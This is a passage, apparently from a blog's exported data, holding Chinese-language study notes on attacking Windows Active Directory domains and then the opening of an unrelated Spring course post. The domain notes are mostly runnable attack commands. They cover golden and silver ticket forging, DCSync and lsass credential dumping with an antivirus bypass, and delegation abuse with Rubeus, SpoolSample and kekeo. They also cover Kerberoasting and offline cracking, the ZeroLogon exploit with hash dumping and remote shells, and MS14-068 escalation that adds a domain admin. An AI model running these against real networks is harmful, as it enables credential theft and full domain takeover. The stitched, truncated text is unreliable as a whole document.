值\n域的 KRBTGT 账号的 HASH\n伪造任意用户名\n\n\n前面使用 MS14-068 获取了域控权限，可以使用 PsExec 进行反弹 cmd\n\nPsExec64.exe &#x2F;accepteula &#x2F;s \\\\WIN-9ESHUR52A3G.moonsec.fbi cmd\nklist #查看当前内存中的票据\n\n\n需要上传 mimikatz 进行执行，这里直接使用域控主机执行命令\n\nmimikatz(commandline) # privilege::debug\nmimikatz(commandline) # lsadump::dcsync &#x2F;domain:moonsec.fbi &#x2F;all &#x2F;csvn 或 lsadump::lsa &#x2F;inject\nmimikatz(commandline) # lsadump::dcsync &#x2F;domain:moonhack.com &#x2F;user:krbtgt\n#建议使用下面这条，可以将hash和SID一起导出\nmimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync &#x2F;domain:moonsec.fbi &#x2F;user:krbtgt&quot; &quot;exit&quot; &gt; loghash.txt\n\n\n使用 mimikatz 生成金票.kirbi 文件并保存 —— 该步骤在获取了 SID 和 HASH 之后在普通域用户主机上执行\n\nmimikatz.exe &quot;kerberos::golden &#x2F;admin:system &#x2F;domain:moonsec.fbi &#x2F;sid:S-1-5-21-3501430782-1563410060-2157377696 &#x2F;krbtgt:39e3601fba3f45772f3055ca9554af1f &#x2F;ticket:ticket.kirbi&quot; exit\n#&#x2F;admin:伪造的用户名\n#&#x2F;domain:域名称\n#&#x2F;sid:SID值，注意是去掉最后一个-的SID值\n#krbtgt:krbtgt的hash值\n#&#x2F;ticket:生成的票据名称 &#x2F;&#x2F;不是写入内存中的命令\n\n\n\n黄金票据的使用：普通域账户利用黄金票据创建域管理员账户\n使用普通域用户，通过 mimikatz 中的 kerberos::ptt 功能将 ticket.kirbi 导入内存中\n\nmimikatz # kerberos::purge #清除内存凭证缓存\nmimikatz # kerberos::ptt C:\\Users\\test\\ticket.kirbi #导入票据\n\n\n导入后可执行上述创建域用户并提升为域管理员权限\n\n# 白银票据\nklist #查看当前内存中的票据\n\n\n如果说黄金票据是伪造的 TGT, 那么白银票据就是伪造的 ST。 在 Kerberos 认证的第三步，Client 带着 ST 和 Authenticator3 向 Server 上的某个服务进行请求，Server 接收到 Client 的请求之后，通过自己的 Master Key 解密 ST, 从而获得 Session Key。通过 Session Key 解密 Authenticator3，进而验证对方的身份，验证成功就让 Client 访问 server 上的指定服务了。 所以我们只需要知道 Server 用户的 Hash 就可以伪造出一个 ST, 且不会经过 KDC， 但是伪造的门票只对部分服务起作用\n\n\n特点：\n\n不需要与 KDC 交互\n需要 server 的 NTLM Hash\n\n\n\nmimikatz 制作银票：\n\n\n登录到域服务器的 administrator，执行 mimikatz 的命令获取 NTLM 和 SID\n\n\nwhoami &#x2F;all #获取SID\nmimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt;log.txt #获取hash\n\n\n使用 mimikatz 清空票据，再导入伪造的银票 —— 在普通域用户执行\n\nkerberos::purge\nkerberos::golden /domain:moonsec.fbi /sid:S-1-5-21-3068616892-3890610424-3278931909 /target:12server-dc.moonsec.fbi /service:cifs /rc4:42e2656ec24331269f82160ff5962387 /user:administrator /ptt\nkerberos::golden /domain:&lt;域名> /sid:&lt;域 SID> /target:&lt;目标服务器主机名>/service:&lt;服务类型> /rc4:&lt;NTLM Hash> /user:&lt;用户名> /ptt\n#其中用户名可以随便写，服务类型根据以下的选择，因为没有TGT去不断申请ticket，只能针对某一服务来进行伪造\n\n\n-_-mimikatz 复现失败\n\n\n\n\nkekeo 制作银票\n\nkerberos::purge #清空票据缓存\ntgt::ask /user:administrator /domain:moonsec.fbi /ntlm:42e2656ec24331269f82160ff5962387\n#tgt::ask /user:用户名 /domain:域名 /ntlm:NTLM Hash\nkerberos::ptt TGT_administrator@MOONSEC.FBI_krbtgt~moonsec.fbi@MOONSEC.FBI.kirbi\n\n# 金票和银票的区别\n\n获取的权限不同\n\n金票：伪造的 TGT，可以获取任意 Kerberos 的访问权限\n银票：伪造的 ST，只能访问指定的服务，如 CIFS\n\n\n认证流程不同\n\n金票：同 KDC 交互，但不同 AS 交互\n银票：不同 KDC 交互，直接访问 Server\n\n\n加密方式不同\n\n金票：由 krbtgt NTLM Hash 加密\n银票：由服务账号 NTLM Hash 加密\n\n\n\n# 域委派攻击\n# 1、域委派的相关知识\n\n\n\n\n\n\n\n\n\n1.1-1.5 来源：————————————————\n 版权声明：本文为 CSDN 博主「山山而川’」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/qq_44159028/article/details/123994104\n# 1.1 什么是委派\n\n\n首先了解一下什么是委派，委派即委托安排，我把这件事委托给你做了。域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动\n\n\n委派主要分为非约束委派 (Unconstrained delegation) 和约束委派 (Constrained delegation) 两个方式，还有一种是基于资源的约束委派（Resource Based Constrained Delegation）\n\n\n# 1.2 委派的由来\n\n在 Windows 2000 Server 首次发布 Active Directory 时，Microsoft 必须提供一种简单的机制来支持用户通过 kerberos 向 web server 进行身份验证并需要代表该用户更新后端数据库服务器上的记录的方案。这通常称为 &quot;kerberos 双跳问题&quot;，并且要求进行委派，以便 web server 在修改数据库记录时模拟用户。\n这里说的 &quot;以便 web server 在修改数据库记录时模拟用户&quot; 需要如何理解？\n比如数据库中的相关数据需要修改，如果此时如果是让当前的 web server 的服务账户去进行修改的话，那么也就无法记录到到底是谁去修改了这个数据，此时如果出了问题就不知道该去问谁了，这种业务情况下就可能就是需要委派这种功能来进行解决，那么委派之后的情况就是，让当前的 web server 的服务账户去操作，但是 web server 同样带有客户的信息，在修改相关数据的时候，用的是对应客户操作者的记录\n\n# 1.3 为什么使用域委派\n\n为什么需要域委派呢，比如现在有 web 服务器和文件服务器，当用户 A 访问 web 服务器去请求某个资源时，web 服务器上本身并没有该资源，所以 web 服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：用户 A 访问 web 服务器，服务器再以用户 A 的身份去访问文件服务器\n\n# 1.4 域委派流程\n\n\n一个域内普通用户 jack 通过 Kerberos 协议认证到前台 WEB 服务后，前台运行 WEB 服务的服务账号 websvc 模拟 (Impersonate) 用户 jack，以 Kerberos 协议继续认证到后台服务器，从而在后台服务器中获取 jack 用户的访问权限，即域中单跳或者多跳的 Kerberos 认证\n流程\n\n域内用户 jack 以 Kerberos 方式认证后访问 Web 服务器\nWeb 服务以 websvc 服务账号运行，websvc 向 KDC 发起 jack 用户的票据申请\nKDC 检查 websvc 用户的委派属性，如果被设置，则返回 jack 用户的可转发票据 TGT\nwebsvc 收到 jack 用户 TGT 后，使用该票据向 KDC 申请访问文件服务器的服务票据 ST\nKDC 检查 websvc 的委派属性，如果被设置，且申请的文件服务在允许的列表清单中，则返回一个 jack 用户访问文件服务的授权票据 ST\nwebsvc 收到的 jack 用户的授权票据 ST 后，可访问文件服务，完成多跳认证\n\n\n\n# 1.5 委派的用户\n\n在域内的可以委派的账户有两种一，种是主机账户（Net Computer），另一种是用 setspn 手动添加的服务账户（Net User）\n\n服务账号 (Service Account)，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如 MS SQL Server 在安装时，会在域内自动注册服务账号 SqlServiceAccount，这类账号不能用于交互式登录，也就是说无法通过 SqlServiceAccount 来通过 3389 进行 rdp 登录\n\n\n\n\n\n\n# 1.6 三种委派攻击\n分别是：\n\n非约束委派攻击\n约束委派攻击\n资源委派攻击\n\n# 2、非约束委派攻击\n\n非约束性委派的原理是：用户想访问服务 A，于是向 KDC 提交认证，KDC 发现 A 是非约束性委派，会把 TGT 放在 ST 中一并给用户。然后用户用这个 ST 去访问服务 A，服务 A 就相当于获得了用户的 TGT，把 TGT 放入 lsass 进程，然后就可以拿着用户的 TGT 以用户的身份去访问该用户权限能够访问的服务了\n从攻击角度来说：如果攻击者拿到了一台配置了非约束委派的机器权限，可以诱导管理员来访问该机器，然后可以得到管理员的 TGT，从而模拟管理员访问任意服务，相当于拿下了整个域环境\n\n\n\n当服务账号或者主机被设置为非约束性委派时，其 userAccountControl 属性会包含 TRUSTED_FOR_DELEGATION\n当服务账号或者主机被设置为约束性委派时，其 userAccountControl 属性包含 TRUSTED_TO_AUTH_FOR_DELEGATION，且 msDS-AllowedToDelegateTo 属性会包含被约束的服务\n\n# 2.1 域环境\n\n域备份主机 windows server 2012 - dc1\n域控主机 windows server 2012 - dc2\n域成员主机 windows server 2012 - 12server1\n域成员主机 windows server 2012 - 12server2\n\n# 2.2 配置非约束主机和用户\n\n在 dc2 添加 12server2 非约束委派主机，添加新用户 web，并将 web 赋予服务账号权限\n\n# 使用域控权限创建用户并授予服务权限\nsetspn -A https&#x2F;web web #添加用户为服务账号\nsetspn -d https&#x2F;web web #删除用户服务账号权限\n\n\n\n为使设置生效，可重启一遍\n当服务账号或者主机被设置为非约束性委派时，其 userAccountControl 属性会包含 TRUSTED_FOR_DELEGATION\n\n# 2.3 powershell 查询非委派约束\n\n使用 powershell 脚本在普通域用户（12server1）权限下执行查询哪些主机和用户被设置了非约束委派\npowerview2.ps1 或者 powerview.ps1\n\n#导入ps模块\nImport-Module .\\PowerView.ps1\n#查询非约束主机\nGet-NetComputer -Unconstrained -Domain redteam.club\n#查询非约束用户\nGet-NetUser -Unconstrained -Domain redteam.club | select name\n# 2.4 adfind 查询非约束委派\n\n使用 adfind.exe 在普通域用户 ==（12server1）权限下执行查询哪些主机和用户被设置了非约束委派\n\n#非约束委派主机\nAdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName\n#非约束委派用户\nAdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(userAccountControl:1.2.840.113556.1.4.803:&#x3D;524288))&quot; cn distinguishedName\n\n\n# 2.5 非约束委派攻击\n\n首先使用 12server2 ping ad1，能够 ping 通，且使用 dir 命令查看 ad1 的 C 盘文件无法访问\n域管理员用户使用 winrm 服务器远程连接委派主机 12server2，连接成功后如下图\n\nEnter-PSSession -ComputerName 12server2\n\n\n此时域管的凭证已经存储到委派域成员用户的内存中，在提权到本地管理员用户后使用 mimikatz 导出相关凭证（在 12server2 中导出）\n\nprivilege::debug #进入调试模式\nsekurlsa::tickets &#x2F;export #导出凭证\n\n\n使用 mimikatz 将 krbtgt 的票据导入\n\nkerberos::ptt 凭证名称 #导入凭证\nkerberos::list #查看当前存在凭证\n\n\n获取到该凭证之后，可以将此凭证保存下来，上传到 12server1 中使用 12server1 的域普通成员用户使用 mimikatz 进行导入，导入后同样可在域内访问任意主机和服务\n\n\n\n非约束委派就是将一个主机或用户设为非约束委派状态，诱导域控主机访问，访问后委派用户就会有域控的凭证，使用 mimikatz 导出这个凭证之后再将凭证导入到其他普通域成员主机中，就可以获取域控权限\n\n# 2.6 非约束委派 &amp; Spooler\n\n上文中的非约束委派需要域管理员主动访问委派主机或用户，才能获取相关凭证，比较鸡肋，可以使用非约束委派 + Spooler 打印机服务强制指定的主机进行连接\nSpooler：打印系统远程协议（MS-RPRN），一种旧的但是默认启用的服务\n\n\n\n在该方法中，域用户可以使用 MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex)  方法强制任何运行了 Spooler 服务的计算机以通过 Kerberos 或 NTLM 对攻击者选择的目标进行身份验证\n\n\n\n攻击复现环境\n\n域：redteam.club\n域控：ad2\n备份域控：ad1\n域内主机：12server1、12server2\n\n\n攻击条件：攻击者控制了一个开启了非约束委派的账户并获取了本地管理员权限，域控开启了 Spooler 服务\n\n拿下一个具有 Kerberos 非约束委派的主机 (主机账户)\n找到一台运行 Print Spooler 服务 (默认为自启而且为 System 权限) 的 DC\n管理员身份使用 Rubeus 的监听模式\n\n\n\n\n\n以本地管理员权限开启 Rubeus 监听\nrunas &#x2F;user:12server2\\administrator cmd.exe #在cmd中输入密码切换为本地管理员权限\nRubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:ad2$\n# 我们可以用Rubeus来监听Event ID为4624事件，这样可以第一时间截取到域控的TGT\n# &#x2F;interval:1 设置监听间隔1秒\n# &#x2F;filteruser 监听对象为我们的域控，注意后面有个$，如果不设置监听对象就监听所有的TGT\n# DC$为域控的主机名字加$\n\n\n使用 Spoolsamlpe.exe 利用打印机服务让域控机向本机验证身份\nspoolsample.exe ad2 12server2\n# 表示利用打印服务强制让域控机向admin-PC主机验证身份，这样我们的Rubeus就可以监听到TGS了\n\ntips：为便于复制方便，Rubeus 监听可写为\nRubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:ad2$ &gt; log.txt\n\n然后可直接使用记事本的编辑 - 查找和替换删掉开头的空格\n\n\n将 TGT 使用 powershell 直接运行转换到正常的 TGT，这样就可以得到正常的 TGT\n[IO.File]::WriteAllBytes(\"ticket.kirbi\", [Convert]::FromBase64String(\"得到的base64\"))\n\n\n\n将这个 TGT 票据注入到当前会话中，导出域控的所有 hash，就可以获得 krbtgt 的 hash\n# mimikatz以域用户身份运行\nkerberos::ptt ticket.kirbi\nmimikatz.exe &quot;lsadump::dcsync &#x2F;domain:redteam.club &#x2F;all &#x2F;csv&quot; &quot;exit&quot; &gt; hash.txt\n\n\n\n\n注意：我们这儿获得的 TGT 票据，不能算黄金票据，因为我们获得的权限只是域控的本地管理权限，所以 * 不能连接域控 *，但是我们确可以因此获取所以用户的 hash，所以能制作真正的黄金票据～\n\n# 2.7 Spooler 制作黄金票据\n\n通过上述获取了 krbtgt 的 hash 之后，再获取本账号的 SID，就可以制作黄金票据\n\n\n\n获取本账号的 sid\nwhoami &#x2F;domain 或 whoami &#x2F;user\n#S-1-5-21-2365300756-2663045586-4193326672-1105 注意不要后面的1105\n\n\n使用 mimikatz 制作黄金票据\nmimikatz &quot;kerberos::golden &#x2F;domain:redteam.club &#x2F;sid:S-1-5-21-2365300756-2663045586-4193326672 &#x2F;krbtgt:b6e0fcce3106665064de4917394ccc27 &#x2F;user:administrator &#x2F;ticket:ntlm.kirbi&quot; &quot;exit&quot;\n\n\n使用 mimikatz 导入票据\nmimikatz &quot;kerberos::purge&quot; &quot;kerberos::ptt ntlm.kirbi&quot;\n\n\n\n\n\n因为有了黄金票据，可以直接使用 PsExec 反弹任意主机的 shell 且不需要密码，并且获取到的都是域控权限\n\nPsExec64.exe \\\\ad1 cmd -accepteula\n\n\n# 3、约束委派攻击\n# 3.1 约束委派介绍\n\n由于非约束委派的不安全性，引入了约束委派，对 kerberos 协议进行了扩展，加入 S4U，其中 S4U 支持两个子协议：Service for User to Self (S4U2Self) 和 Service for User to Proxy ( S4U2proxy )，这两个扩展都允许服务代表用户从 KDC 请求票证。 S4U2self 可以代表自身请求针对其自身的可转发的 Kerberos 服务票据 (ST1) ； S4U2proxy 可以以用户的名义请求其它服务的 ST2 ，约束委派就是限制了 S4U2proxy 扩展的范围。\n\n# 3.2 约束委派流程\n\nuser 访问 serviceA，向 DC 发起 kerberos 认证，域控返回 user 的 TGT 和 ST1 票据，user 使用 ST1 票据对 serviceA 进行访问；\n如果配置了 serviceA 到 serviceB 的约束委派，则 serviceA 能使用 S4U2Proxy 协议将用户发给自己的可转发的 ST1 票据以用户的身份发给 DC；DC 返回 serviceA 一个用来访问 serviceB 的 ST2 票据，这样 serviceA 就能以用户的身份对 serviceB 发起访问。\n\n# 3.3 攻击原理\n\n由于服务用户只能获取某个用户（或主机）的服务的 ST1 而非 TGT ， 所以只能模拟用户访问特定的服务 ；但是如果能够拿到约束委派用户（或主机）的明文密码或 hash，那么就可以伪造 S4U 的请求，伪装成服务用户以任意用户的权限申请访问指定服务的 ST2。\n\n# 3.4 攻击复现\n\n\nad2 添加一个 websec 用户，并将其设置为服务用户\nsetspn -A cifs&#x2F;12server2.redteam.club websec #将websec用户加上spn标识变成服务用户\n\n\n\n已知在约束委派的情况下，服务用户只能获取某个用户或者主机的服务 ST，只能用模拟用户访问特定的服务， 是无法获取用户的 TGT 的，如果能够获得到开启了约束委派的服务的用户的明文密码或者 hash 就可以伪造 S4U 的请求，进而伪造服务用户以任意账户的权限访问服务的 ST\n\n\n约束用户 有 TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION 关键字段\n\n\n\n\n\n12server2 普通域用户使用 AdFind 工具使用命令查询存在的约束账户\n# 查询委派用户\nAdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306368)(msds-allowedtodelegateto&#x3D;*))&quot; cn distinguishedName msds-allowedtodelegateto\n# 查询委派主机\nAdFind.exe -b &quot;DC&#x3D;redteam,DC&#x3D;club&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; cn distinguishedName msds-allowedtodelegateto\n\n\n\n12server2 使用 kekeo 请求服务用户的 TGT，需要已知明文密码或 hash，普通域用户权限即可\ntgt::ask &#x2F;user:websec &#x2F;domain:redteam.club &#x2F;password:QWEasd123 &#x2F;ticket:test.kirbi  #使用明文密码请求\ntgt::ask &#x2F;user:websec &#x2F;domain:redteam.club &#x2F;NTLM:XXXXX #使用hash请求\n\n\n\n使用 kekeo 利用这个票据通过伪造 S4U 请求以 administrator 身份访问 websec 的 ST\ntgs::s4u &#x2F;tgt:TGT_websec@REDTEAM.CLUB_krbtgt~redteam.club@REDTEAM.CLUB.kirbi &#x2F;user:Administrator@redteam.club &#x2F;service:cifs&#x2F;ad1.redteam.club\n#tgt：导出的服务用户TGT\n#user：要伪造的用户\n#service：服务&#x2F;目标主机.域名\n\n\n\n这时候 kekeo 当前路径下会出现 administrator 的 ticket (用于访问 websec 的 CIFS 服务), 将这个凭证导入访问 websec 的 cifs 服务\nkeberos::ptt 凭证 #导入凭证\n\n\n\n# 3.5 小结\n\n当我们查询到约束委派的用户时，并知晓它的明文密码或 NTLM hash，才能利用工具请求它的 TGT；\n然后利用这个 TGT，伪造 S4U 请求以 administrator 身份去访问这个服务账号的 ST；\n这里可以生成任意权限身份的 ticket，我们是以 administrator 身份去访问的，所以生成的就是 administrator 的 ticket，这个就是 ST2；最后使用工具导入这个 ST2，那我们就能够成功访问域控；通常约束委派多数用于用户权限维持。\n\n# 4、基于资源的约束委派 # 空\n# 获取域控权限\n在域渗透中、作为渗透测试人员，获取域控的权限基本上可以获取整个内网的权限\n# 1、高权限读取本地密码\n\n当域管理员在域成员机器上登录进行工作的时候，会将明文密码保存在本地进行的 lsass.exe，可以通过 mimikatz 来读取到本地的明文密码\n利用条件：获取域主机的本地管理员权限，域管理员在本机上登录过\n在无杀软的情况下使用 mimikatz 直接读取\n\nprivilege::debug #提权\nsekurlsa::logonpasswords #导出hash\nmimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt #直接在cmd执行导出到文件\n\n\n\n在有杀软的情况下可以通过 procdump+mimikatz 的方式进行绕过\n\nprocdump64.exe 是微软自带的工具，可直接搜索下载\n\n\n\n#1、导出lsass.exe\nprocdump64.exe -accepteula -ma lsass.exe lsass.dmp\n#2、将lsass.exe导出的dmp文件保存到本地，使用mimikatz读取\nmimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; &quot;exit&quot; &gt; log.txt\n\n如果目标机器是 windows server 2012，通过添加注册表，在通过锁屏，让管理员重新登录即可读取明文\n\n#添加注册表，设置UseLogonCredential设置为1\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f\n#利用一下powershell脚本进行锁屏\nFunction Lock-WorkStation\n&#123;\n    $signature &#x3D; @&quot;\n    [DllImport(&quot;user32.dll&quot;, SetLastError &#x3D; true)]\n    public static extern bool LockWorkStation();\n    &quot;@\n    $LockWorkStation &#x3D; Add-Type -memberDefinition $signature -name\n    &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru\n    $LockWorkStation::LockWorkStation() | Out-Null\n&#125;\nLock-WorkStation\n\n获取密码后可以通过 net use 命令进行明文连接，或使用 impacket 包下的 wmiexec.py 进行哈希连接，或导入 mimikatz 进行访问\n\n#net use 明文连接\nnet use \\\\10.10.10.137\\ipc$ &quot;123456&quot; &#x2F;user:redteam\\administrator\n#wmiexec.py hash连接\npython3 wmiexec.py -hashes 00000000000000000000000000000000:a5843d3ee2da05158aaf16ecb3ba969b administrator@10.10.10.137 &quot;whoami&quot;\npython3 wmiexec.py -hashes 00000000000000000000000000000000:a5843d3ee2da05158aaf16ecb3ba969b administrator@10.10.10.137\n# 2、SYSVOL 组策略获取密码\n\n由于需要多域环境，无法演示\n\n# 3、Kerberoasting\n\n\nSPN 为服务主体名称，是服务实列 (MSSQL,HTTP 等) 的唯一标识，如果在林中安装服务的多个实列，每个实列都有自己的 SPN，如果 kerberos 服务票证的加密类型为 RC4_HMAC_MD5，就可以导出 TGS 对其进行离线破解，就有可能获取到域用户的密码\n\n\n原理：当域内某个用户去请求同域内的某个服务资源时，请求会首先被送达 KDS 的 AS 中进行身份认证，认证通过后 AS 会返回一个用用户密码 hash 加密的 TGT 给用户，然后用户再拿着 这个 TGT 向 TGS 去请求，TGS 会返回一个用对应服务账号的密码 hash 加密过 (RC4_HMAC_MD5) 的专门用于访问特定服务的服务票据，最后，用户只需拿这张服务票据去访问对应的服务资源即可，而问题就出在 TGS 返回服务票据，目标服务此时用的是一个域账号来运行的，那么 TGS 在向用户返回服务票据时，用户就可以拿到这张服务票据中的 hash，由于 TGS 服务票据加密算法已知，尝试穷举口令，模拟加密过程，生成 TGS 进行比较。如果 TGS 相同，代表口令正确，就能获得目标服务实例的明文口令\n\n\n使用 setspn 查询 spn (windows7 和 server2008 默认自带)，这是正常 kerberos 票据行为的一部分，因此查询 SPN 的操作很难被检测\n\n\nsetspn.exe -q *&#x2F;* #查询所有SPN\nsetspn.exe -T test -q *&#x2F;* #-T:查询指定域\n#以CN开头的为代表一个账号，机器账号为Computers，域用户账号为Users\n\n\n查询域内注册的 SPN (GetUserSPNs.vbs 脚本)\n\ncscript GetUserSPNs.vbs\n\n\n使用 powerview.ps1 脚本查询域内注册的 SPN\n\nImport-Module .\\PowerView.ps1\nGet-NetUser -spn -AdminCount|Select name,whencreated,pwdlastset,lastlogon\n\n\n给 mySQL 服务注册 SPN\n\nsetspn -s mysql&#x2F;12server4.redteam.club:3306 test\n#-s：服务名&#x2F;主机全名 端口 用户名\n\n将 kerberos 的加密方式换成 RC4_HMAC_MD5—— 位于服务器管理 - 工具 - 组策略管理\n\n\n# 3.1 使用 mimikatz 配合脚本穷举\n\n请求指定的 TGS，完成之后 klist 就能查看相应的票据\n\nAdd-Type -AssemblyName System.IdentityModel\nNew-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"mysql/12server4.redteam.club:3306\"\n\n\n\n使用 mimikatz 导出票据\n\nkerberos::list &#x2F;export\n\n\n将文件导入 kali 中使用 tgsrepcrack.py 破解密码\n\npython3 tgsrepcrack.py wordlist.txt mssql.kirbi\n#wordlist.txt是密码列表\n#mssql.kirbi是凭证文件\n\n\n如果服务的创建者是域管理员用户，有概率破解出域管理员的明文密码\n\n# 3.2 使用 hashcat 穷举\n\n使用 System.IdentityModel.Tokens.KerberosRequestorSecurityToken  请求 TGS，在返回结果中提取出 TGS，输出的 TGS 可选择 John the Ripper 或 Hashcat 进行破解。\n\n.\\Invoke-Kerberoast -OutputFormat Hashcat #查看所有信息\n.\\Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation #只查看hash信息\npowershell 未导出信息\n\n\n使用 rubeus.exe 提取出 hash\n\nRubeus.exe kerberoast\n\n\n使用 kali 自带 hashcat 对该 hash 进行穷举\n\nhashcat -m 13100 kerberos.txt ./kerberoast-master/MimiPwds.txt -o found.txt --force\n#未复现成功。。。\n# 4、内网协议 NTLM 之内网大杀器 CVE-2019-1040 漏洞\n\n前面基于资源的域委派没学，后期补齐\n\n# 5、CVE-2020-1472-ZeroLogon\n# 5.1 简介\n\nNetlogon 使用的 AES 认证算法中的 vi 向量默认为 0，导致攻击者可以绕过认证，同时其设置域控密码的远程接口也使用了该函数，导致可以将域控中保存在 AD 中的管理员 password 设置为空\n\n# 5.2 影响版本\n\n\n\n\n\n\n\n\n\nWindows Server 2008 R2 for x64-based Systems Service Pack 1Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation)\n# 5.3 复现：zerologin 脚本\n\n使用 zerologon_tester.py 检测是否存在漏洞\n\npython3 zerologon_tester.py ad01 10.10.10.137\n# 参数：域控主机名 IP\n\n\n漏洞利用：置空 DC 的密码，脚本： git clone https://github.com/dirkjanm/CVE-2020-1472\n\npython3 cve-2020-1472-exploit.py DC_NETBIOS_NAME DC_IP_ADDR\npython3 cve-2020-1472-exploit.py ad01 10.10.10.137\n\n\n使用 impacket 包中的 secretsdum.py 来获取相关的 HASh\n\npython3 secretsdump.py DOMAIN&#x2F;DC_NETBIOS_NAME$@DC_IP_ADDR -no-pass\npython3 secretsdump.py redteam.club&#x2F;ad01\\$@10.10.10.137 -no-pass\n\n\n使用 wmiexec.py 登录，获取一个 SHELL\n\npython3 wmiexec.py -hashes &lt;HASH&gt; DOMAIN&#x2F;DOMAIN_USER@DC_IP_ADDR\npython3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:a5843d3ee2da05158aaf16ecb3ba969b redteam.club&#x2F;administrator@10.10.10.137\n\n# 5.4 恢复原 hash\n\n在域控 shell 上导出 sam\n\nreg save HKLM\\SYSTEM system.save\nreg save HKLM\\SAM sam.save\nreg save HKLM\\SECURITY security.save\nget system.save\nget sam.save\nget security.save\ndel &#x2F;f system.save\ndel &#x2F;f sam.save\ndel &#x2F;f security.save\nexit\n\n使用 secretsdump.py 脚本获取文件中的原 hash\n\npython3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL\n\n\nreinstall_original_pw.py，执行以下命令，获取 SAM 中原来的 HASH 并恢复原 hash\n\npython3 reinstall_original_pw.py ad01 10.10.10.137\n\n\n使用 secretsdump.py 再次连接检测域密码\n\npython3 secretsdump.py ad01.redteam.club&#x2F;administrator@10.10.10.137 -hashes :42e2656ec24331269f82160ff5962387\n\n# 6、MS14-068 漏洞提权\n# 6.1 简介\n\nserver2008 有效 MS14068 是一个能够使普通用户提权到域控权限的权限提升漏洞。攻击者可以通过构造特定的请求包来达到提升权限的目的。\n\n# 6.2 复现\n\n第一步：利用 MS14-068 伪造生成 TGT\n\nMS14-068.exe -u 用户名@域名 -p 用户密码 -s 完整域ID -d 完整域地址\nMS14-068.exe -u 12server1@moonsec.fbi -p 123456 -s S-1-5-21-3501430782-1563410060-2157377696-1108 -d 08server-dc.moonsec.fbi\n\n\n第二步：利用 mimikatz 将工具得到的 TGT 票据写入内存，创建缓存证书\n\nkerberos::ptc TGT_test@moonsec.fbi.ccache\n\n第三步：获取域管理员权限。创建一个 test 账号并加入域管理员组，从而随时可以登录域控主机进行操作\n\nPsExec.exe \\\\08server-dc cmd.exe\n&#x2F;&#x2F; 添加test用户net user test abc123! &#x2F;add &#x2F;domain\n&#x2F;&#x2F; 把 test 用户添加进域管理员组net group &quot;domain admins&quot; test &#x2F;add &#x2F;domain\n&#x2F;&#x2F; 查看域管理员net group &quot;domain admins&quot; &#x2F;domain\n\n\n或者使用 goldenPac.py 脚本 (python 打包 exe 执行)\n\npython3 goldenPac.py -dc-ip 192.168.254.145 -target-ip 192.168.254.145 moonsec.fbi&#x2F;test:123456@08server-dc.moonsec.fbi\n# 7、窃取域管理员令牌\n\n学习 cs 后补充\n\n# 8、进程迁移\n\n学习 cs 后补充\n\n","slug":"域渗透小结","date":"2022-10-06T13:57:10.000Z","categories_index":"web安全","tags_index":"web安全,内网渗透","author_index":"cCor4ng3"},{"id":"946249c65165e1a3d66f50e0cb6e89e7","title":"Spring","content":"# 1、课程内容\n\nSpring\nSpringMVC\nMaven 高级\nSpringBoot\nMyBatisPlus\n\n# 2、Spring 课程介绍\n# 2.1 为什么要学\n\nSpring 技术是 JavaEE 开发必备技能，企业开发技术选型命中率 &gt; 90%\n专业角度\n\n简化开发，降低企业级开发的复杂性\n框架整合，高效整合其他技术，提高企业级应用开发与运行效率\n\n\n简化开发\n\nIoC\nAOP\n\n事务处理\n\n\n\n\n框架整合\n\nMyBatis\nMyBatis-plus\nStruts\nStruts2\nHibernate\n\n\n\n# 2.2 怎么学\n\n学习 Spring 框架设计思想\n学习基础操作，思考操作与思想间的联系\n学习案例，熟练应用操作的同时，体会思想\n\n# 3、初识 Spring\n# 3.1 Spring 家族与 Spring\n\n\n官网：Spring | Home\n\n\nSpring 发展到今天已经形成了一种开发的生态圈，Spring 提供了若干个项目，每个项目都用于完成特定的功能\n\n\n\n\nSpring Framework：底层设计框架，举足轻重地位\nSpring Boot：提高开发速度\nSpring Cloud：分布式开发相关技术\n\n# 3.2 Spring 发展史\n\n# 4、Spring Framework 系统架构\n# 4.1 Spring Framework 系统架构图\n\nSpring Framework 是 Spring 生态圈中最基础的项目，是其他项目的根基\n\n\n\n\nCore Container：核心容器\n\nSpring 是用来管理对象的技术\n\n\nAOP：面向切面编程，依赖核心容器\n\n\nAspects：AOP 